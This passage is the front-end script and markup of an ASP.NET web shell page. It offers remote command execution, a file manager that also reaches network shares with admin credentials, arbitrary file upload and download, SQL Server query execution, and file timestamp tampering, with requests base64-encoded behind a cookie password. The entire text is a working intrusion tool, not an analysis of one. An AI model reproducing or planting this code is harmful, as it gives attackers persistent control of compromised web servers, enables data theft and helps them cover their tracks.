            var info = JSON.parse(data);
            console.log(data);
            console.log(info);
            if (info.dir) {
                var f = document.createElement("div");
                f.className = "objF";

                var s = document.createElement("div");
                s.className = "objLeft objS";
                s.innerText = "Get All Size";
                s.style.cursor = "pointer";
                s.onclick = function () { getAllSize(); };

                f.appendChild(s);
                Frame.appendChild(f);

                for (var i = 0; i < info.dir.length; i++)
                    addFolder(Frame, info.dir[i]);
            }
            if (info.file)
                for (var i = 0; i < info.file.length; i++)
                    addFile(Frame, info.file[i].name, info.file[i].size)
        }
    }
    function sendAddress(adminUP)
    {
        document.getElementById("loader").style.display = "inline-block";
        var address = document.getElementsByName("exadd")[0].value;
        if (!adminUP)
            adminUP = "";
        var info = {
            data: "exadd=" + b64EncodeUnicode(address) + adminUP,
            onSuccess: function (resText) {
                proecessDirectory(resText);
                //document.getElementById("loader").style.display = "none";
                //var data = b64DecodeUnicode(resText)
                //makeLocation();
                //var Frame = document.getElementById("objFrame");
                //Frame.innerHTML = "";
                //if(data.startsWith("Error"))
                //{
                //    addError(Frame, data);
                //}
                //else
                //{
                //    var info = JSON.parse(data);
                //    console.log(data);
                //    console.log(info);
                //    if(info.dir)
                //    {
                //        var f = document.createElement("div");
                //        f.className="objF";
       
                //        var s = document.createElement("div");
                //        s.className="objLeft objS";
                //        s.innerText = "Get All Size";
                //        s.style.cursor = "pointer";
                //        s.onclick = function(){getAllSize();};

                //        f.appendChild(s);
                //        Frame.appendChild(f);

                //        for (var i = 0; i < info.dir.length; i++)
                //            addFolder(Frame, info.dir[i]);
                //    }
                //    if(info.file)
                //        for (var i = 0; i < info.file.length; i++)
                //            addFile(Frame, info.file[i].name, info.file[i].size)
                //}
            }
        };
        sendData(info);
    }

    function makeLocation()
    {
        var loc = document.getElementById("objLocation");
        loc.innerHTML = "";

        //var lbl = document.createElement("div");
        //lbl.className = "objLabel";
        //lbl.innerText = "Location :";
        //loc.appendChild(lbl);

        var root = document.createElement("div");
        root.className = "objRight objD objL";
        root.innerText = "root";
        root.style.margin = "0";
        root.onclick = function () {
            setAddress("root");
        };
        loc.appendChild(root);

        var currentAddress = getCurrentAddress();
        var curAdd = currentAddress.split("\\");
        var sendLoc = "";
        if (currentAddress.startsWith("\\\\"))
            sendLoc += "\\\\";
        for (var i = 0; i < curAdd.length; i++) {

            if (curAdd[i] == "" || curAdd[i] == "root")
                continue;

            sendLoc += curAdd[i] + "\\";

            var o = document.createElement("div");
            o.innerText = curAdd[i] + "\\";
            o.setAttribute("loc", sendLoc);
            o.className = "objRight objD objL";
            o.onclick = function(){
                document.getElementsByName("exadd")[0].value = this.getAttribute("loc");
                sendAddress();
            };
                        
            loc.appendChild(o);
        }

        if (currentAddress.startsWith("\\\\"))
        {
            loc.childNodes[1].innerText = "\\\\" + loc.childNodes[1].innerText;
        }

        loc.lastChild.style.display = "inline-block";
        loc.lastChild.onclick = function(){};
        loc.lastChild.className = "objB";
    }

    function addError(parent, error)
    {
        var f = document.createElement("div");
        f.className = "objF";

        var d = document.createElement("div");
        d.className ="objRight objD objError";
        d.innerText = error;

        f.appendChild(d);
        parent.appendChild(f);
    }

    function addFolder(parent, dir)
    {
        var f = document.createElement("div");
        f.className="objF";
       
        var d = document.createElement("div");
        d.className ="objRight objD";
        d.innerText = dir.name;
        d.onclick = function(){setAddress(this.innerText);};

        var s = document.createElement("div");
        s.className ="objLeft objS dir";
        if (sizeArray[getCurrentAddress() + "\\" + dir.name])
            setSize(s, sizeArray[getCurrentAddress() + "\\" + dir.name]);
        else
            s.innerText = "...";

        s.style.cursor = "pointer";
        s.onclick = function(){getSize(s,d.innerText);};

        f.appendChild(s);
        f.appendChild(d);

        if (dir.totalSize)
        {
            var divProgress = document.createElement("div");
            divProgress.className = "driveSizeProgress";
            var divSize = document.createElement("div");
            var total = Number(dir.totalSize);
            var free = Number(dir.freeSpace);
            var percent = (((total - free) / total) * 100);
            divSize.style.width = percent + "%";
            if (percent > 90)
                divSize.style.backgroundColor = "#d82523";
            divProgress.appendChild(divSize);

            var divText = document.createElement("div");
            divText.className = "driveSizeText";
            divText.innerHTML = "<span class='t'>Size</span><span class='v'>" + dir.sizeText + "</span>";

            var divFormat = document.createElement("div");
            divFormat.className = "driveSizeText";
            divFormat.innerHTML = "<span class='t'>FileSystem</span><span class='v'>" + dir.format + "</span>";

            var divType = document.createElement("div");
            divType.className = "driveSizeText";
            divType.innerHTML = "<span class='t'>Description</span><span class='v'>" + dir.type + "</span>";

            

            f.appendChild(divProgress);
            f.appendChild(divText);
            f.appendChild(divFormat);
            f.appendChild(divType);
        }

        parent.appendChild(f);
    }

    function addFile(parent, name, size)
    {
        var f = document.createElement("div");
        f.className="objF";
        var s = document.createElement("div");
        s.className ="objLeft objS";
        setSize(s, size)
        var n = document.createElement("div");
        n.className ="objRight objN";
        n.innerText=name;
        n.onclick = function () { expView(this.innerText); };

        //<div class="iCmd iDownload">Download</div> <div class="iCmd iDelete">Delete</div> <div class="iInput iRename"><span class="t"><input type="text" /></span><div class="v">Rename</div></div>

        var btnD = document.createElement("div");
        btnD.className = "iCmd iDownload";
        btnD.innerText = "Download";
        btnD.onclick = function () { expDownload(name, this); };

        var btnL = document.createElement("div");
        btnL.className = "iCmd iDelete";
        btnL.innerText = "Delete";
        btnL.onclick = function () { expDelete(name, this); }

        var btnR = document.createElement("div");
        btnR.className = "iInput iRename";

        var spanT = document.createElement("span");
        spanT.className = "t"
        var inputT = document.createElement("input");
        inputT.type = "text";
        spanT.appendChild(inputT);

        var spanV = document.createElement("span");
        spanV.className = "v"
        spanV.innerText = "Rename"
        spanV.onclick = function () { expRename(name, this); };

        btnR.appendChild(spanT);
        btnR.appendChild(spanV);



        var btnCC = document.createElement("div");
        btnCC.className = "iInput iCopy";

        var spanCCT = document.createElement("span");
        spanCCT.className = "t"
        var inputCCT = document.createElement("input");
        inputCCT.type = "text";
        spanCCT.appendChild(inputCCT);

        var spanCopy = document.createElement("span");
        spanCopy.className = "v copy"
        spanCopy.innerText = "Copy"
        spanCopy.onclick = function () { expCopy(name, this); };

        var spanCut = document.createElement("span");
        spanCut.className = "v"
        spanCut.innerText = "Move"
        spanCut.onclick = function () { expMove(name, this); };

        btnCC.appendChild(spanCCT);
        btnCC.appendChild(spanCopy);
        btnCC.appendChild(spanCut);


        f.appendChild(s);
        f.appendChild(n);
        f.appendChild(btnD);
        f.appendChild(btnL);
        f.appendChild(btnR);
        f.appendChild(btnCC);

        parent.appendChild(f);
    }

    function getCurrentAddress()
    {
        var address = document.getElementsByName("exadd")[0];
        if(address.value.endsWith("\\"))
            address.value = address.value.substring(0, address.value.length - 1);
        return address.value;
    }

    function expDelete(name, sender) {
        var path = getCurrentAddress() + "\\" + name;
        if (confirm("Are you sure you want to delete this file?\r\n" + path) == true) {
            requestTextResult("delete=" + b64EncodeUnicode(path), sender, false, function (res) { proecessDirectory(res); });
        }
    }

    function expRename(name, sender) {
        var path = getCurrentAddress() + "\\" + name;
        var input = getCurrentAddress() + "\\" + sender.parentNode.childNodes[0].childNodes[0].value;
        requestTextResult("rename1=" + b64EncodeUnicode(path) + "&rename2=" + b64EncodeUnicode(input), sender, false, function (res) { proecessDirectory(res); });
    }
    function expCopy(name, sender) {
        var path = getCurrentAddress() + "\\" + name;
        var input = sender.parentNode.childNodes[0].childNodes[0].value;
        requestTextResult("copy1=" + b64EncodeUnicode(path) + "&copy2=" + b64EncodeUnicode(input), sender, false);
    }
    function expMove(name, sender) {
        var path = getCurrentAddress() + "\\" + name;
        var input = sender.parentNode.childNodes[0].childNodes[0].value;
        requestTextResult("rename1=" + b64EncodeUnicode(path) + "&rename2=" + b64EncodeUnicode(input), sender, false, function (res) { proecessDirectory(res); });
    }

    function expView(name, sender) {
        var path = getCurrentAddress() + "\\" + name;
        requestTextResult("view=" + b64EncodeUnicode(path), sender, false);
    }
    function expDownload(name) {
        var path = getCurrentAddress() + "\\" + name;

        document.getElementById("donInput").value = path;
        document.getElementById("donSubmit").click();
    }
    function expUpload() {
        var expSaveAddress = document.getElementById("expSaveAddress");
        expSaveAddress.value = getCurrentAddress();
        subm();
    }

    function setAddress(name)
    {
        var address = document.getElementsByName("exadd")[0];
        if(address.value.endsWith("\\"))
            address.value = address.value.substring(0, address.value.length - 1);
        var path = name;
        if (path == 'root' || path.startsWith('\\\\'))
            address.value = path;
        else
            address.value += "\\" + name;
        if (name.startsWith("\\\\"))
            sendAddress("&adminU=" + b64EncodeUnicode(document.getElementsByName("adminU")[0].value) + "&adminP=" + b64EncodeUnicode(document.getElementsByName("adminP")[0].value) );
        else
            sendAddress();
    }

    function getNextSize(alls)
    {
        if(alls.length > 0)
        {
            var s = alls[0];
            alls.shift();
            console.log(alls);
            console.log(s);
            getSize(s, s.nextSibling.innerText, function(){getNextSize(alls)});
        }
    }

    function getAllSize() {
        var allSizes = [].slice.call(document.getElementsByClassName("objLeft objS dir"));
        getNextSize(allSizes);
    }

    function getSize(objSize, name, callBack)
    {
        objSize.innerText = "";
        var ldr = document.createElement("span");
        ldr.className="loader";
        ldr.style.width="12px";
        ldr.style.height="12px";
        ldr.style.top="3px";
        ldr.style.left ="64px";
        objSize.appendChild(ldr);
        var address = getCurrentAddress() + "\\" + name;
        var info = {
            data: "gsize=" + b64EncodeUnicode(address),
            onSuccess:function(resText){
                
                ldr.remove();
                var data = b64DecodeUnicode(resText)
                setSize(objSize, data)
                if(!data.startsWith("Error"))
                    sizeArray[address] = data;

                if(callBack)
                    callBack();
            }
        };
        sendData(info);
    }

    function checkEnter(ev)
    {
        if(ev.which == 13 || ev.keyCode == 13)
        {
            sendAddress();
            return false;
        }
        return true;
    }

    function setSize(obj, size)
    {
        if (size.startsWith("!"))
            obj.innerHTML = "<span class='cat'>!</span>" + size.substring(1);
        else
            obj.innerText = size;

        if (size.startsWith("Error"))
        {
            obj.innerText = "Error !";
            obj.setAttribute("title", size);
            obj.style.color = "#fff"
            obj.style.backgroundColor = "#FF3929";
            obj.style.textAlign = "center"
        }
        else if (size.endsWith("KB")) {
            obj.style.color = "#fff"
            obj.style.backgroundColor = "#22be34";
        }
        else if (size.endsWith("MB")) {
            obj.style.color = "#00000099"
            obj.style.backgroundColor = "#ffdf05";
        }
        else if (size.endsWith("GB")){
            obj.style.color = "#fff"
            obj.style.backgroundColor = "#ff7701";
        }
        else if (size.endsWith("TB")) {
            obj.style.color = "#fff"
            obj.style.backgroundColor = "#FF3929";
        }
        else {
            obj.style.color = "#00000099"
            obj.style.backgroundColor = "#54ffff";
        }
    }

    function sendData(info)
    {
        var data = info.data;
        var xh = new XMLHttpRequest();
        xh.onreadystatechange = function(){
            if(this.readyState == 4 && this.status == 200)
            {
                info.onSuccess(this.responseText);
            }
        };
        xh.open("POST", location.pathname, true);
        xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xh.send("p=" + readCookie("p") + "&" + data);
    }

    function b64DecodeUnicode(str) {
        return decodeURIComponent(Array.prototype.map.call(atob(str), function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
        }).join(''))
    }

    function b64EncodeUnicode(str) {
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function (match, p1) {
            return String.fromCharCode(parseInt(p1, 16))
        }))
    }

    function grabEnter(event, sender) {
        var key = event.keyCode | event.which;
        if (event.shiftKey && key == 13)
        {
            sender.form.submit();
            return false;
        }
        else if (key == 13) {
            if (sender.name == "cmd") {
                requestTextResult("cmdB=" + b64EncodeUnicode(getElementValue("cmd")), sender, true);
                return false;
            }
        }

        return true;
    }

    function requestTextResult(data, sender, isAppend, callBack) {

        var ldr = null;
        if (sender)
            ldr = loader(sender);
        var info = {
            data: data,
            onSuccess: function (res) {
                if (ldr)
                    ldr.remove();
                if (callBack)
                    callBack(res)
                else {
                    var data = b64DecodeUnicode(res);
                    print(data, isAppend);
                }
            }
        };

        sendData(info);
    }

    function loader(sender) {
        //<span id="loader" class="loader" style="display:none"></span>
        var ldr = document.createElement("span");

        ldr.className = "loader";
        ldr.style.top = sender.getBoundingClientRect().top;
        ldr.style.left = sender.getBoundingClientRect().left + sender.offsetWidth + 5;
        document.body.appendChild(ldr);
        return ldr;
    }

    function print(str, isAppend) {
        if (isAppend)
        {
            var log = document.getElementById("log");
            log.innerHTML = document.getElementById("log").innerHTML + str;
            log.scrollTop = log.scrollHeight;
        }
        else
            document.getElementById("log").innerHTML = str;
    }

    function getElementValue(name) {
        return document.getElementsByName(name)[0].value;
    }
</script>
</head>
<body>
<asp:Panel ID="pnlM" runat="server" Visible="false" style="flex-grow:1;flex-direction:column;display:flex;">
<div id="header">
<div class="tbbt">
    <button class="tblnk active" onclick="openTab(this, 'tbMain')">Command</button>
    <button id="tabExp" class="tblnk" onclick="openTab(this, 'tbDir')">Explorer</button>
    <button class="tblnk" onclick="openTab(this, 'tbUpload')">Upload</button>
    <button class="tblnk" onclick="openTab(this, 'tbDownload')">Download</button>
    <button class="tblnk" onclick="openTab(this, 'tbSqlServer')">Sql Server</button>
    <button class="tblnk" onclick="openTab(this, 'tbChangeTime')">Change Time</button>
</div>
<div id="tbMain" class="tb" style="display:block">
    <t>Current Location :</t>
    <y id="d"><%= Server.MapPath(string.Empty) + "\\"%></y>
    <input type="button" value="Use" onclick="use()" />
    <div style="float: right;margin-right:5px">v7.1</div>
    <hr style="margin:5px 0 8px 0" />
    <form method="post">
        <input name="cmd" type="text" value='<%= cmd %>' style="width:100%" onkeypress="return grabEnter(event, this);" />
    </form>
</div>
<div id="tbDir" class="tb">
        <form method="post" enctype="multipart/form-data">
            <t>File :</t>
            <input name="isExp" class="mmm" type="hidden" value="1" />
            <input name="upl" type="file" />
            <input id="expSaveAddress" name="sav" class="mmm" type="text" style="display:none" />
            <input type="submit" value="Upload" onclick="expUpload();" /><br />
        </form>
    <t>Address :</t>
    <input name="exadd" type="text" value='<%= exadd %>' onkeypress="return checkEnter(event);" />
    <input type="submit" value="Explore" onclick="sendAddress();" style="margin-right:5px;" />
    <span id="loader" class="loader" style="display:none"></span><br />
        <t>Admin Username :</t>
        <input name="adminU" class="mmm" type="text" style="width:200px" value="<%= adminU %>" />
        <t>Password :</t>
        <input name="adminP" class="mmm" type="text" style="width:200px" value="<%= adminP %>" />
    <hr />
    <div class="objLocHolder">
        <div class="objLeft">Location :</div><div id="objLocation"><div class="objRight objD objL" onclick="setAddress(this.innerText);" style="margin:0">root</div></div>
    </div>
    <div id="objFrame">
    </div>
</div>
<div id="tbUpload" class="tb">
    <form method="post" enctype="multipart/form-data">
        <t>File name :</t>
        <input name="upl" type="file" /><br>
        <t>Save as :</t>
        <input id="uplSaveAddress" name="sav" class="mmm" type="text" value='<%= sav %>' />
        <input name="vir" type="checkbox" /><g>Is virtual path</g><br>
        <t>New File name :</t>
        <input name="nen" class="mmm" type="text" value='<%= nen %>' />
        <input type="submit" value="Upload" onclick="subm();" />
    </form>
    <hr>
    <form method="post">
        <t>Base64 File :</t>
        <textarea name="baseFile"></textarea>
        <input name="baseVir" type="checkbox" /><g>Is virtual path</g><br>
        <t>File Path and Name :</t>
        <input name="baseAddr" class="mmm" type="text" value='<%= baseAddr %>' />
        <input type="submit" value="Upload" onclick="subm();" />
    </form>
</div>
<div id="tbDownload" class="tb">
    <form method="post">
        <t>File name :</t>
        <input id="donInput" class="mmm" name="don" type="text" value='<%= don %>' />
        <input id="donSubmit" type="submit" value="Download" onclick="subm();" />
    </form>
</div>
<div id="tbSqlServer" class="tb">
    <form method="post">
        <input style="margin: 0 0 3px 192px" type="button" value="Standard Connection Sample" onclick="document.getElementsByName('sqc')[0].value = 'Server=.;Database=db;User Id=user;Password=pass'" />
        <input style="margin: 0 0 3px 0" type="button" value="Trusted Connection Sample" onclick="document.getElementsByName('sqc')[0].value = 'Server=.;Database=db;Trusted_Connection=True'" /><br />
        <t>Connection String :</t>
        <input name="sqc" class="mmm" type="text" value='<%= sqc %>' /><br />
        <t>Query :</t>
        <textarea name="sqq" class="mmm"><%= sqq %></textarea>
        <input type="submit" value="Run" onclick="subm();" />
    </form>
</div>
<div id="tbChangeTime" class="tb">
    <form method="post">
        <input name="hid" type="hidden" />
        <t>File name :</t>
        <input name="tfil" class="mmm" type="text" value='<%= tfil %>' />
        <input type="submit" value="Get" onclick="subm(); document.getElementsByName('hid')[0].value = '1'" /><br>
        <t>From This File :</t>
        <input name="ttar" class="mmm" type="text" value='<%= ttar %>' />
        <input type="submit" value="Set" onclick="subm(); document.getElementsByName('hid')[0].value = '2'" /><br>
        <t>New Time :</t>
        <input name="ttim" class="mmm" type="text" value='<%= ttim %>' />
        <input type="submit" value="Set" onclick="subm(); document.getElementsByName('hid')[0].value = '3'" />
    </form>
</div>
</div>
<pre id="log" runat="server"></pre>
<script>var ll = document.getElementById('log'); if (ll.innerHTML) ll.innerHTML = b64DecodeUnicode(log.innerHTML);<%= SpecialScript %></script>
</asp:Panel>
</body>
</html>
